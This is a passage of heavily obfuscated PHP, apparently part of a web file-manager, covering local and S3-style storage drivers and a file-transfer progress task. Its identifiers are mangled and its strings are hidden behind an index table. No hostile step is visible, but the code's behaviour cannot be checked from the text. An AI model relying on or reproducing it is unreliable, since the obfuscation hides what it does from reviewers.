filesize_64($Â»Ÿ·Ú°); } public function info($ÖÁÜ”î‰) { $ÖÁÜ”î‰ = $this->iconvSystem($ÖÁÜ”î‰); if ($this->isFolder($ÖÁÜ”î‰)) { return $this->folderInfo($ÖÁÜ”î‰); } else { if ($this->isFile($ÖÁÜ”î‰)) { return $this->fileInfo($ÖÁÜ”î‰); } } return !1; } protected function infoChildren($¬É©¹², &$ Òöæ€ê, $œöˆÛõş = true) { $ŞÏ––Üè =& $_SERVER[¬ÏÕ§Áú]; check_abort_echo(); $¬É©¹² = rtrim($¬É©¹², $ŞÏ––Üè[8]) . $ŞÏ––Üè[8]; if ($œöˆÛõş) { $¬É©¹² = $this->iconvSystem($¬É©¹²); } if (!($—æËâÏ¼ = @opendir($¬É©¹²))) { return; } while (($ßäÌ˜«Ü = readdir($—æËâÏ¼)) !== !1) { if ($ßäÌ˜«Ü == $ŞÏ––Üè[10] || $ßäÌ˜«Ü == $ŞÏ––Üè[1418]) { continue; } $ßÉÙ—Âõ = $¬É©¹² . $ßäÌ˜«Ü; if (is_file($ßÉÙ—Âõ) || is_link($ßÉÙ—Âõ)) { $ Òöæ€ê[$ŞÏ––Üè[90]]++; $ Òöæ€ê[$ŞÏ––Üè[89]] += filesize_64($ßÉÙ—Âõ); } else { if (is_dir($ßÉÙ—Âõ)) { $ Òöæ€ê[$ŞÏ––Üè[91]]++; $this->infoChildren($ßÉÙ—Âõ, $ Òöæ€ê, !1); } } } closedir($—æËâÏ¼); } private function folderInfo($£ßˆŒñ‘, $Ò–äñô = false) { $¸Â„íŸ€ =& $_SERVER[¬ÏÕ§Áú]; $£ßˆŒñ‘ = rtrim($£ßˆŒñ‘, $¸Â„íŸ€[8]) . $¸Â„íŸ€[8]; $ä‡º¬„ = $this->iconvApp($this->pathThis($£ßˆŒñ‘)); if ($Ò–äñô) { return array($¸Â„íŸ€[32] => $ä‡º¬„, $¸Â„íŸ€[97] => $this->getPathOuter($£ßˆŒñ‘), $¸Â„íŸ€[33] => $¸Â„íŸ€[88]); } $“‰©‹ëƒ = array($¸Â„íŸ€[32] => $ä‡º¬„, $¸Â„íŸ€[97] => $this->getPathOuter($£ßˆŒñ‘), $¸Â„íŸ€[33] => $¸Â„íŸ€[88], $¸Â„íŸ€[244] => @filectime($£ßˆŒñ‘), $¸Â„íŸ€[98] => @filemtime($£ßˆŒñ‘), $¸Â„íŸ€[1517] => @fileatime($£ßˆŒñ‘), $¸Â„íŸ€[1518] => is_readable($£ßˆŒñ‘), $¸Â„íŸ€[1519] => is_writable($£ßˆŒñ‘), $¸Â„íŸ€[1520] => get_mode($£ßˆŒñ‘)); return $“‰©‹ëƒ; } private function fileInfo($ñáÖ¿û, $§‡¢£†é = false) { $»›Ìå“ =& $_SERVER[¬ÏÕ§Áú]; $ºÅ—‡¨‚ = $this->iconvApp($this->pathThis($ñáÖ¿û)); if ($§‡¢£†é) { return array($»›Ìå“[32] => $ºÅ—‡¨‚, $»›Ìå“[97] => $this->getPathOuter($ñáÖ¿û), $»›Ìå“[33] => $»›Ìå“[243], $»›Ìå“[89] => $this->size($ñáÖ¿û), $»›Ìå“[179] => $this->ext($ºÅ—‡¨‚)); } $‘æø³  = array($»›Ìå“[32] => $ºÅ—‡¨‚, $»›Ìå“[97] => $this->getPathOuter($ñáÖ¿û), $»›Ìå“[33] => $»›Ìå“[243], $»›Ìå“[244] => @filectime($ñáÖ¿û), $»›Ìå“[98] => @filemtime($ñáÖ¿û), $»›Ìå“[1517] => @fileatime($ñáÖ¿û), $»›Ìå“[89] => $this->size($ñáÖ¿û), $»›Ìå“[179] => $this->ext($ºÅ—‡¨‚), $»›Ìå“[1518] => is_readable($ñáÖ¿û), $»›Ìå“[1519] => is_writable($ñáÖ¿û), $»›Ìå“[1520] => get_mode($ñáÖ¿û)); return $‘æø³ ; } public function exist($ÃÕõÅ§À) { $ÃÕõÅ§À = $this->iconvSystem($ÃÕõÅ§À); return @file_exists($ÃÕõÅ§À); } public function isFile($ Šùç…¾) { $ Šùç…¾ = $this->iconvSystem($ Šùç…¾); return @is_file($ Šùç…¾); } public function isFolder($Ó£ËÀøú) { $Ó£ËÀøú = $this->iconvSystem($Ó£ËÀøú); return @is_dir($Ó£ËÀøú); } public function listPath($êêƒ‰€¸, $Éø©İ¦© = false) { $¤ÎÊæÎ¾ =& $_SERVER[¬ÏÕ§Áú]; $êêƒ‰€¸ = $this->iconvSystem($êêƒ‰€¸); $êêƒ‰€¸ = rtrim($êêƒ‰€¸, $¤ÎÊæÎ¾[8]) . $¤ÎÊæÎ¾[8]; $îËêÃ² = array($¤ÎÊæÎ¾[95] => array(), $¤ÎÊæÎ¾[96] => array()); if (!($ğ©‡Ğñ = @opendir($êêƒ‰€¸))) { return $îËêÃ²; } while (($¹ªÀ ¬­ = readdir($ğ©‡Ğñ)) !== !1) { if ($¹ªÀ ¬­ == $¤ÎÊæÎ¾[10] || $¹ªÀ ¬­ == $¤ÎÊæÎ¾[1418]) { continue; } $Á¤İá¬å = $êêƒ‰€¸ . $¹ªÀ ¬­; if (is_file($Á¤İá¬å)) { $îËêÃ²[$¤ÎÊæÎ¾[96]][] = $this->fileInfo($Á¤İá¬å, $Éø©İ¦©); } else { $îËêÃ²[$¤ÎÊæÎ¾[95]][] = $this->folderInfo($Á¤İá¬å, $Éø©İ¦©); } } closedir($ğ©‡Ğñ); return $îËêÃ²; } public function listAll($Ç¦Šİœ, &$›…­µ¤ = array()) { $²†î¾¦ =& $_SERVER[¬ÏÕ§Áú]; $Ç¦Šİœ = $this->iconvSystem($Ç¦Šİœ); $Ç¦Šİœ = rtrim($Ç¦Šİœ, $²†î¾¦[8]) . $²†î¾¦[8]; if (!($’Ê¢Ïà÷ = @opendir($Ç¦Šİœ))) { return $›…­µ¤; } while (($ÜÕºµ¿ = readdir($’Ê¢Ïà÷)) !== !1) { if ($ÜÕºµ¿ == $²†î¾¦[10] || $ÜÕºµ¿ == $²†î¾¦[1418]) { continue; } $ı»“™ŞÏ = $Ç¦Šİœ . $ÜÕºµ¿; $Ñ²ü¦» = is_dir($ı»“™ŞÏ) && !is_link($ı»“™ŞÏ) ? 1 : 0; $ı»“™ŞÏ = $Ñ²ü¦» ? $ı»“™ŞÏ . $²†î¾¦[8] : $ı»“™ŞÏ; $›…­µ¤[] = array($²†î¾¦[97] => $this->getPathOuter($ı»“™ŞÏ), $²†î¾¦[88] => $Ñ²ü¦», $²†î¾¦[98] => intval(@filemtime($ı»“™ŞÏ)), $²†î¾¦[89] => $Ñ²ü¦» ? 0 : intval($this->size($ı»“™ŞÏ))); if ($Ñ²ü¦») { $this->listAll($ı»“™ŞÏ, $›…­µ¤); } } closedir($’Ê¢Ïà÷); return $›…­µ¤; } public function has($ëã“Šº, $ÏÑœ‘ûÔ = false, $è—úã§ª = true) { $Åš†Š‘º =& $_SERVER[¬ÏÕ§Áú]; $ëã“Šº = $this->iconvSystem($ëã“Šº); $ëã“Šº = rtrim($ëã“Šº, $Åš†Š‘º[8]) . $Åš†Š‘º[8]; if (!($Å’‚şåå = @opendir($ëã“Šº))) { return !1; } $»¬äìÈË = 0; $ü­íğ„ï = 0; $¦»¦ì§¯ = 0; while (($œ•èèĞ‰ = readdir($Å’‚şåå)) !== !1) { if ($œ•èèĞ‰ == $Åš†Š‘º[10] || $œ•èèĞ‰ == $Åš†Š‘º[1418]) { continue; } $¨•ê¨§Ğ = $ëã“Šº . $œ•èèĞ‰; if ($ÏÑœ‘ûÔ) { $¦»¦ì§¯++; if (@is_file($¨•ê¨§Ğ)) { $»¬äìÈË++; } else { $ü­íğ„ï++; } if ($¦»¦ì§¯ > 10000) { break; } continue; } if ($è—úã§ª) { if (@is_file($¨•ê¨§Ğ)) { return !0; } } else { if (@is_dir($¨•ê¨§Ğ . $Åš†Š‘º[8])) { return !0; } } } closedir($Å’‚şåå); if ($ÏÑœ‘ûÔ) { return array($Åš†Š‘º[252] => $»¬äìÈË, $Åš†Š‘º[253] => $ü­íğ„ï); } return !1; } public function hashSimple($Û‘¨Ö¤ˆ) { $ãú£•Ìâ =& $_SERVER[¬ÏÕ§Áú]; if (!$Û‘¨Ö¤ˆ) { return md5($ãú£•Ìâ[12]); } $Û‘¨Ö¤ˆ = $this->iconvSystem($Û‘¨Ö¤ˆ); $Ó¡³¼¶ = $this->size($Û‘¨Ö¤ˆ); $ßğ»§Ææ = 200; $†Ÿ¶îı = 50; if ($Ó¡³¼¶ <= $ßğ»§Ææ * $†Ÿ¶îı) { return $this->hashMd5($Û‘¨Ö¤ˆ) . $Ó¡³¼¶; } $Ï¼¸Ø = $ãú£•Ìâ[12]; $£Æ›ÅÄ‹ = intval($Ó¡³¼¶ / $†Ÿ¶îı); $ñÎÆâ¶ = fopen($Û‘¨Ö¤ˆ, $ãú£•Ìâ[1521]); if (!$ñÎÆâ¶) { return $Ï¼¸Ø; } for ($¿›Á§Ç£ = 0; $¿›Á§Ç£ < $†Ÿ¶îı; $¿›Á§Ç£++) { fseek_64($ñÎÆâ¶, $£Æ›ÅÄ‹ * $¿›Á§Ç£); $Ï¼¸Ø .= fread($ñÎÆâ¶, $ßğ»§Ææ); } fseek_64($ñÎÆâ¶, $Ó¡³¼¶ - $ßğ»§Ææ); $Ï¼¸Ø .= fread($ñÎÆâ¶, $ßğ»§Ææ); fclose($ñÎÆâ¶); return md5($Ï¼¸Ø) . $Ó¡³¼¶; } public function getContent($™¸Ã”ˆ) { $™¸Ã”ˆ = $this->iconvSystem($™¸Ã”ˆ); return file_get_contents($™¸Ã”ˆ); } public function setContent($¬×Û†à¨, $£±åŠáÖ = '') { $¬×Û†à¨ = $this->iconvSystem($¬×Û†à¨); $›×òîõ¾ = @file_put_contents($¬×Û†à¨, $£±åŠáÖ, LOCK_EX); if (!$›×òîõ¾) { $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][1513], !0); } clearstatcache(); @chmod($¬×Û†à¨, $this->pathAuth); return $›×òîõ¾ === !1 ? !1 : !0; } public function fileSubstr($Û«£Ù, $î¸²¥ÕÈ = 0, $Ûæ¦§ù— = false) { $ö†”ÊĞ² =& $_SERVER[¬ÏÕ§Áú]; $Û«£Ù = $this->iconvSystem($Û«£Ù); if ($Ûæ¦§ù— === !1) { $Ûæ¦§ù— = $this->size($Û«£Ù); } if ($Ûæ¦§ù— <= 0) { return $ö†”ÊĞ²[12]; } $´óÔßùÚ = fopen($Û«£Ù, $ö†”ÊĞ²[1521]); if (!$´óÔßùÚ) { return !1; } fseek_64($´óÔßùÚ, $î¸²¥ÕÈ); $Çñìø¡÷ = fread($´óÔßùÚ, $Ûæ¦§ù—); fclose($´óÔßùÚ); if (!$Çñìø¡÷) { $this->writeLog(__FUNCTION__ . $ö†”ÊĞ²[1513], !0); } return $Çñìø¡÷; } public function upload($¨ßÕ¨ÙÁ, $óº›€ÍÍ, $Ù´¼…”Ô = false, $¹¼ã‚¼Ì = REPEAT_REPLACE) { if ($Ù´¼…”Ô) { return $this->moveFile($óº›€ÍÍ, $¨ßÕ¨ÙÁ); } return $this->copyFile($óº›€ÍÍ, $¨ßÕ¨ÙÁ); } public function setModifyTime($Ûóñ»¡ı, $¦¿ıƒğ® = '') { @touch($Ûóñ»¡ı, intval($¦¿ıƒğ®)); } public function download($ãšèÃÑ, $¯×ŒÙìÙ) { return $this->iconvSystem($ãšèÃÑ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($´÷¨Åöó) { parent::__construct($´÷¨Åöó); $this->setSignVersion($_SERVER[¬ÏÕ§Áú][260]); } public function fileOutImage($Ê ÔÓ£¶, $‘¯é¬ß¾ = 250) { $¦‘’øÂ =& $_SERVER[¬ÏÕ§Áú]; if ($this->size($Ê ÔÓ£¶) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ê ÔÓ£¶, $‘¯é¬ß¾); } $¸ì†Š˜¢ = array($¦‘’øÂ[1522] => $¦‘’øÂ[1523] . $‘¯é¬ß¾ . $¦‘’øÂ[1524]); $Ÿº±†¸‹ = $this->link($Ê ÔÓ£¶, $¸ì†Š˜¢); $this->fileOutLink($Ÿº±†¸‹); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ ÒŠÀÖ ) { parent::__construct($ ÒŠÀÖ ); $this->setSignVersion($_SERVER[¬ÏÕ§Áú][260]); } public function uploadFormData($ñéÈÊ¦Ù, $»¼§À¢Å = 3600) { return $this->uploadFormDataV2($ñéÈÊ¦Ù, $»¼§À¢Å); } } goto e¿¥„ÜÓ¿Ş; A™ˆ…§Ÿˆ§: class TaskFileTransfer extends Task { protected function startAfter() { $ˆåÄùÕ =& $_SERVER[¬ÏÕ§Áú]; $ÜÅÀ¾³¤ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ˆåÄùÕ[1868], array($this, $ˆåÄùÕ[1869])); Hook::bind($ˆåÄùÕ[1363], array($this, $ˆåÄùÕ[1870])); Hook::bind($ˆåÄùÕ[1871], array($this, $ˆåÄùÕ[1872])); Hook::bind($ˆåÄùÕ[692], array($this, $ˆåÄùÕ[1873])); Hook::bind($ˆåÄùÕ[693], array($this, $ˆåÄùÕ[1874])); Hook::bind($ˆåÄùÕ[699], array($this, $ˆåÄùÕ[1875])); Hook::bind($ˆåÄùÕ[700], array($this, $ˆåÄùÕ[1876])); Hook::bind($ˆåÄùÕ[695], array($this, $ˆåÄùÕ[1877])); Hook::bind($ˆåÄùÕ[697], array($this, $ˆåÄùÕ[1878])); Hook::bind($ˆåÄùÕ[661], array($this, $ˆåÄùÕ[1879])); Hook::bind($ˆåÄùÕ[658], array($this, $ˆåÄùÕ[1879])); Hook::bind($ˆåÄùÕ[663], array($this, $ˆåÄùÕ[1879])); Hook::bind($ˆåÄùÕ[665], array($this, $ˆåÄùÕ[1879])); Hook::bind($ˆåÄùÕ[667], array($this, $ˆåÄùÕ[1879])); Hook::bind($ˆåÄùÕ[1880], array($this, $ˆåÄùÕ[1881])); Hook::bind($ˆåÄùÕ[683], array($this, $ˆåÄùÕ[1882])); $this->sourceModelCopyFlag = !1; Hook::bind($ˆåÄùÕ[1883], array($this, $ˆåÄùÕ[1884])); Hook::bind($ˆåÄùÕ[1885], array($this, $ˆåÄùÕ[1886])); Hook::bind($ˆåÄùÕ[1887], array($this, $ˆåÄùÕ[1888])); $ÜÅÀ¾³¤[$ˆåÄùÕ[1889]] = LNG($ˆåÄùÕ[1890]); $ÜÅÀ¾³¤[$ˆåÄùÕ[1891]] = 0; $ÜÅÀ¾³¤[$ˆåÄùÕ[1892]] = 0; $ÜÅÀ¾³¤[$ˆåÄùÕ[1190]] = $ˆåÄùÕ[12]; $ÜÅÀ¾³¤[$ˆåÄùÕ[1893]] = $ˆåÄùÕ[12]; $ÜÅÀ¾³¤[$ˆåÄùÕ[1894]] = 0; $ÜÅÀ¾³¤[$ˆåÄùÕ[1895]] = 0; $ÜÅÀ¾³¤[$ˆåÄùÕ[1896]] = 0; if (!$ÜÅÀ¾³¤[$ˆåÄùÕ[1722]]) { $ÜÅÀ¾³¤[$ˆåÄùÕ[1722]] = LNG($ˆåÄùÕ[1897]); } } protected function endAfter() { $„¨‡ş„¼ =& $_SERVER[¬ÏÕ§Áú]; Hook::unbind($„¨‡ş„¼[1868], array($this, $„¨‡ş„¼[1869])); Hook::unbind($„¨‡ş„¼[1363], array($this, $„¨‡ş„¼[1870])); Hook::unbind($„¨‡ş„¼[1871], array($this, $„¨‡ş„¼[1872])); Hook::unbind($„¨‡ş„¼[692], array($this, $„¨‡ş„¼[1873])); Hook::unbind($„¨‡ş„¼[693], array($this, $„¨‡ş„¼[1874])); Hook::unbind($„¨‡ş„¼[699], array($this, $„¨‡ş„¼[1875])); Hook::unbind($„¨‡ş„¼[700], array($this, $„¨‡ş„¼[1876])); Hook::unbind($„¨‡ş„¼[695], array($this, $„¨‡ş„¼[1877])); Hook::unbind($„¨‡ş„¼[697], array($this, $„¨‡ş„¼[1878])); Hook::unbind($„¨‡ş„¼[661], array($this, $„¨‡ş„¼[1879])); Hook::unbind($„¨‡ş„¼[658], array($this, $„¨‡ş„¼[1879])); Hook::unbind($„¨‡ş„¼[663], array($this, $„¨‡ş„¼[1879])); Hook::unbind($„¨‡ş„¼[665], array($this, $„¨‡ş„¼[1879])); Hook::unbind($„¨‡ş„¼[667], array($this, $„¨‡ş„¼[1879])); Hook::unbind($„¨‡ş„¼[1880], array($this, $„¨‡ş„¼[1881])); Hook::unbind($„¨‡ş„¼[683], array($this, $„¨‡ş„¼[1882])); Hook::unbind($„¨‡ş„¼[1883], array($this, $„¨‡ş„¼[1884])); Hook::unbind($„¨‡ş„¼[1885], array($this, $„¨‡ş„¼[1886])); Hook::unbind($„¨‡ş„¼[1887], array($this, $„¨‡ş„¼[1888])); } public function copyMoveStart($¨šó±ÔÓ, $ÈÀ½ÊÚì, $˜İ÷ìø, $Íñ¹Ùæó) { $¥æËÚÂ¬ =& $_SERVER[¬ÏÕ§Áú]; self::log($¥æËÚÂ¬[1898] . $ÈÀ½ÊÚì . $¥æËÚÂ¬[83] . $Íñ¹Ùæó); $¨üÖ‡ÔÄ = rtrim(TEMP_FILES, $¥æËÚÂ¬[8]); if (substr($ÈÀ½ÊÚì, 0, strlen($¨üÖ‡ÔÄ)) == $¨üÖ‡ÔÄ) { return; } if (substr($Íñ¹Ùæó, 0, strlen($¨üÖ‡ÔÄ)) == $¨üÖ‡ÔÄ) { return; } $úéÇŠÌ¿ =& $this->task; $úéÇŠÌ¿[$¥æËÚÂ¬[1899]] = KodIO::transferType($¨šó±ÔÓ, $˜İ÷ìø); $this->update(); } public function updateAfter() { $×òÕ×“‹ =& $_SERVER[¬ÏÕ§Áú]; $ı‰ÅÚåÇ =& $this->task; if (!$ı‰ÅÚåÇ[$×òÕ×“‹[877]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ı‰ÅÚåÇ[$×òÕ×“‹[1899]] == $×òÕ×“‹[1464]) { return; } self::updateTask($ı‰ÅÚåÇ); } private static function updateTask(&$şûè®À†) { $÷û½Ø¾™ =& $_SERVER[¬ÏÕ§Áú]; if ($şûè®À†[$÷û½Ø¾™[1899]] == $÷û½Ø¾™[1334] || $şûè®À†[$÷û½Ø¾™[1899]] == $÷û½Ø¾™[120]) { if ($şûè®À†[$÷û½Ø¾™[1893]]) { $şûè®À†[$÷û½Ø¾™[1896]] = $şûè®À†[$÷û½Ø¾™[1895]] + $şûè®À†[$÷û½Ø¾™[1892]]; } } else { if ($şûè®À†[$÷û½Ø¾™[1899]] == $÷û½Ø¾™[1465]) { if ($şûè®À†[$÷û½Ø¾™[1893]] == $÷û½Ø¾™[1334]) { $şûè®À†[$÷û½Ø¾™[1896]] = $şûè®À†[$÷û½Ø¾™[1895]] + $şûè®À†[$÷û½Ø¾™[1892]] * 0.5; } else { if ($şûè®À†[$÷û½Ø¾™[1893]] == $÷û½Ø¾™[120]) { $şûè®À†[$÷û½Ø¾™[1896]] = $şûè®À†[$÷û½Ø¾™[1895]] + $şûè®À†[$÷û½Ø¾™[1891]] * 0.5 + $şûè®À†[$÷û½Ø¾™[1892]] * 0.5; } } } } $şûè®À†[$÷û½Ø¾™[1839]] = $şûè®À†[$÷û½Ø¾™[1896]] / $şûè®À†[$÷û½Ø¾™[877]]; if ($şûè®À†[$÷û½Ø¾™[1839]] > 0) { $Ò„ò«Â = timeFloat() - $şûè®À†[$÷û½Ø¾™[1841]] - $şûè®À†[$÷û½Ø¾™[1844]]; $şûè®À†[$÷û½Ø¾™[1845]] = $Ò„ò«Â * (1 - $şûè®À†[$÷û½Ø¾™[1839]]) / $şûè®À†[$÷û½Ø¾™[1839]]; } } public function addPath($¨ÈÓ¡È) { $©©İÜÅ× =& $_SERVER[¬ÏÕ§Áú]; if (!$¨ÈÓ¡È) { return; } $ı°ª‚ü =& $this->task; $²‰ß“ = IO::infoWithChildren($¨ÈÓ¡È); $îÃ°Ğ‘‘ = $ı°ª‚ü[$©©İÜÅ×[1900]] ? $ı°ª‚ü[$©©İÜÅ×[1900]][$©©İÜÅ×[1901]] : 0; $ı°ª‚ü[$©©İÜÅ×[1900]] = array($©©İÜÅ×[1901] => $îÃ°Ğ‘‘ + 1, $©©İÜÅ×[514] => $²‰ß“[$©©İÜÅ×[32]], $©©İÜÅ×[97] => $²‰ß“[$©©İÜÅ×[97]], $©©İÜÅ×[603] => $²‰ß“[$©©İÜÅ×[603]] ? $²‰ß“[$©©İÜÅ×[603]] : $²‰ß“[$©©İÜÅ×[97]]); if ($²‰ß“[$©©İÜÅ×[33]] == $©©İÜÅ×[243]) { $ı°ª‚ü[$©©İÜÅ×[1188]] += 1; } else { $ı°ª‚ü[$©©İÜÅ×[1188]] += $²‰ß“[$©©İÜÅ×[92]][$©©İÜÅ×[90]]; if ($²‰ß“[$©©İÜÅ×[204]]) { $ı°ª‚ü[$©©İÜÅ×[1188]] += $²‰ß“[$©©İÜÅ×[92]][$©©İÜÅ×[91]] + 1; } } $ı°ª‚ü[$©©İÜÅ×[877]] += $²‰ß“[$©©İÜÅ×[89]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ÓŞÓ™£¶) { } public function sourceAddHashEnd($¡‘êÑâ) { } public function sourceAddFileStart($˜ìãÅëÁ) { $»ğğ¨òÀ =& $_SERVER[¬ÏÕ§Áú]; $Òä±²¡Ä =& $this->task; $Òä±²¡Ä[$»ğğ¨òÀ[1891]] = $˜ìãÅëÁ[$»ğğ¨òÀ[89]]; $Òä±²¡Ä[$»ğğ¨òÀ[1889]] = $˜ìãÅëÁ[$»ğğ¨òÀ[32]]; $Òä±²¡Ä[$»ğğ¨òÀ[1190]] = $˜ìãÅëÁ[$»ğğ¨òÀ[32]]; $Òä±²¡Ä[$»ğğ¨òÀ[1902]] = $˜ìãÅëÁ[$»ğğ¨òÀ[97]]; $this->update(); } public function sourceAddFileEnd($ŸËéš—¥) { $Ä¸¸§¶ˆ =& $_SERVER[¬ÏÕ§Áú]; $ É»Ò€– =& $this->task; $ É»Ò€–[$Ä¸¸§¶ˆ[1896]] += $ŸËéš—¥[$Ä¸¸§¶ˆ[89]]; $ É»Ò€–[$Ä¸¸§¶ˆ[1902]] = $ŸËéš—¥[$Ä¸¸§¶ˆ[97]]; $this->update(1); } public function copyFileStart($ÊÆÅ¡î—, $ÉÌÉæ¥½, $ëèæÃ¡Ğ, $ï¬ğÓäò, $Üƒ½¥Õó, $Ç¶©ü–¤) { $…‹†» =& $_SERVER[¬ÏÕ§Áú]; $ÆÀÒ»ğ = $Üƒ½¥Õó; if ($ÆÀÒ»ğ == $GLOBALS[$…‹†»[1903]]) { $ÆÀÒ»ğ = $GLOBALS[$…‹†»[1904]]; } $GLOBALS[$…‹†»[1904]] = $Üƒ½¥Õó; $GLOBALS[$…‹†»[1903]] = $Ç¶©ü–¤; $»ëÛ•Ÿ =& $this->task; $»ëÛ•Ÿ[$…‹†»[1889]] = $ÆÀÒ»ğ; $»ëÛ•Ÿ[$…‹†»[1891]] = (int) $ÊÆÅ¡î—->size($ÉÌÉæ¥½); $»ëÛ•Ÿ[$…‹†»[1892]] = 0; $»ëÛ•Ÿ[$…‹†»[1190]] = $…‹†»[12]; $»ëÛ•Ÿ[$…‹†»[1893]] = $…‹†»[12]; $»ëÛ•Ÿ[$…‹†»[1894]] = 0; $Ù»¡Öï = $»ëÛ•Ÿ[$…‹†»[1891]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($»ëÛ•Ÿ[$…‹†»[492]] . $…‹†»[1905]); if ($Ù»¡Öï && file_exists(get_path_father($ï¬ğÓäò))) { Cache::set($»ëÛ•Ÿ[$…‹†»[492]] . $…‹†»[1905], $ï¬ğÓäò); $»ëÛ•Ÿ[$…‹†»[1862]] = array($…‹†»[1906], $…‹†»[1907]); } $this->update(0, $Ù»¡Öï); } public static function updateCopyLocalFileSize($Ò¤…ËŸñ) { $ ¤‰¦‘­ =& $_SERVER[¬ÏÕ§Áú]; $æÅÏ²çÈ = Cache::get($Ò¤…ËŸñ[$ ¤‰¦‘­[492]] . $ ¤‰¦‘­[1905]); if (!$æÅÏ²çÈ || !file_exists($æÅÏ²çÈ)) { return $Ò¤…ËŸñ; } $Ò¤…ËŸñ[$ ¤‰¦‘­[1892]] = @filesize($æÅÏ²çÈ); $Ò¤…ËŸñ[$ ¤‰¦‘­[1896]] += $Ò¤…ËŸñ[$ ¤‰¦‘­[1892]]; self::updateTask($Ò¤…ËŸñ); return $Ò¤…ËŸñ; } public function copyFileEnd($°ØØö¾ß, $ÂŞîÜÊÎ, $±è‰ÀÀ, $ØÓÊ¾·˜, $õ•ºòÙã, $’Ñ¸šë¬) { $ÒŞ–¼† =& $_SERVER[¬ÏÕ§Áú]; $ÁÂ¶ï‘É =& $this->task; $ÁÂ¶ï‘É[$ÒŞ–¼†[1892]] = $ÁÂ¶ï‘É[$ÒŞ–¼†[1891]]; $ÁÂ¶ï‘É[$ÒŞ–¼†[1893]] = $ÒŞ–¼†[12]; unset($ÁÂ¶ï‘É[$ÒŞ–¼†[1862]]); if ($õ•ºòÙã == $ÁÂ¶ï‘É[$ÒŞ–¼†[1889]]) { $ÁÂ¶ï‘É[$ÒŞ–¼†[1895]] += $ÁÂ¶ï‘É[$ÒŞ–¼†[1891]]; $ÁÂ¶ï‘É[$ÒŞ–¼†[1896]] = $ÁÂ¶ï‘É[$ÒŞ–¼†[1895]]; $™ŒØ³§­ = 1; if (isset($ÁÂ¶ï‘É[$ÒŞ–¼†[1902]]) && $ÁÂ¶ï‘É[$ÒŞ–¼†[1902]] == $ÂŞîÜÊÎ) { $™ŒØ³§­ = 0; } $this->update($™ŒØ³§­); } else { $this->update(); $ÁÂ¶ï‘É[$ÒŞ–¼†[1892]] = 0; } Cache::remove($ÁÂ¶ï‘É[$ÒŞ–¼†[492]] . $ÒŞ–¼†[1905]); self::log($ÒŞ–¼†[1908] . $ÂŞîÜÊÎ . $ÒŞ–¼†[83] . $ØÓÊ¾·˜ . $ÒŞ–¼†[65] . $õ•ºòÙã . $ÒŞ–¼†[1909] . $ÁÂ¶ï‘É[$ÒŞ–¼†[1889]]); } public function updateFileEnd($ƒÖ¦ÙÇ®, $×Øíï¸×) { $§ƒÙËÖ‹ =& $_SERVER[¬ÏÕ§Áú]; $Ô­¯øÇ =& $this->task; $Ô­¯øÇ[$§ƒÙËÖ‹[1889]] = $ƒÖ¦ÙÇ®; $Ô­¯øÇ[$§ƒÙËÖ‹[1891]] = $×Øíï¸×; $Ô­¯øÇ[$§ƒÙËÖ‹[1895]] += $×Øíï¸×; $Ô­¯øÇ[$§ƒÙËÖ‹[1896]] = $Ô­¯øÇ[$§ƒÙËÖ‹[1895]]; $this->update(1); self::log($§ƒÙËÖ‹[1910] . $ƒÖ¦ÙÇ®); } public function sourceModelCopy($Ñ¨Ã¸Š) { $ØèÀŒøŸ =& $_SERVER[¬ÏÕ§Áú]; $äÄÀ§¯ê = $Ñ¨Ã¸Š[0]; $äúÑ‰º = $Ñ¨Ã¸Š[1]; $ŞÔ»åö =& $this->task; $this->sourceModelCopyFlag = !0; $ÁÙ÷ÖÔÄ = 0; switch ($äÄÀ§¯ê) { case $ØèÀŒøŸ[659]: $ÁÙ÷ÖÔÄ = 1; break; case $ØèÀŒøŸ[662]: $ŞÔ»åö[$ØèÀŒøŸ[1889]] = $äúÑ‰º[$ØèÀŒøŸ[32]]; break; case $ØèÀŒøŸ[664]: $ÁÙ÷ÖÔÄ = intval($Ñ¨Ã¸Š[$ØèÀŒøŸ[476]] * 0.4); break; case $ØèÀŒøŸ[666]: $ÁÙ÷ÖÔÄ = intval($Ñ¨Ã¸Š[$ØèÀŒøŸ[476]] * 0.2); break; case $ØèÀŒøŸ[668]: $ÁÙ÷ÖÔÄ = intval($Ñ¨Ã¸Š[$ØèÀŒøŸ[476]] * 0.4); break; } $this->update($ÁÙ÷ÖÔÄ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ı§Å±í¸, $Éó‰©œ¡) { $ó×´Âº =& $_SERVER[¬ÏÕ§Áú]; $this->sourceModelCopyFlag = !0; $å¼Şû³– = 1; if (isset($ı§Å±í¸[$ó×´Âº[92]])) { $å¼Şû³– = $ı§Å±í¸[$ó×´Âº[92]][$ó×´Âº[90]]; $å¼Şû³– = $å¼Şû³– + $ı§Å±í¸[$ó×´Âº[92]][$ó×´Âº[91]] + 1; } $this->update($å¼Şû³–); $this->sourceModelCopyFlag = !1; } public function sourceMove($œä¡‹¬Ñ) { $this->sourceRemove($œä¡‹¬Ñ, !1); } public function curlProgress($Ö˜Ÿ’Íá, $È‹¥İÎ¨, $¡Éêüô, $¥şı£ƒ½, $¬Ú¤º‘) { $±–³Õ’¨ =& $_SERVER[¬ÏÕ§Áú]; $½Î¶İÇØ =& $this->task; if ($¬Ú¤º‘ > 0) { $½Î¶İÇØ[$±–³Õ’¨[1190]] = $±–³Õ’¨[1911]; $½Î¶İÇØ[$±–³Õ’¨[1893]] = $±–³Õ’¨[120]; if ($½Î¶İÇØ[$±–³Õ’¨[1891]]) { $½Î¶İÇØ[$±–³Õ’¨[1892]] = $¬Ú¤º‘; } if ($½Î¶İÇØ[$±–³Õ’¨[1894]]) { $½Î¶İÇØ[$±–³Õ’¨[1892]] = $¬Ú¤º‘ + $½Î¶İÇØ[$±–³Õ’¨[1894]]; } } else { if ($¡Éêüô > 0) { if ($½Î¶İÇØ[$±–³Õ’¨[1891]] == $È‹¥İÎ¨) { $½Î¶İÇØ[$±–³Õ’¨[1892]] = $¡Éêüô; $½Î¶İÇØ[$±–³Õ’¨[1190]] = $±–³Õ’¨[1912]; 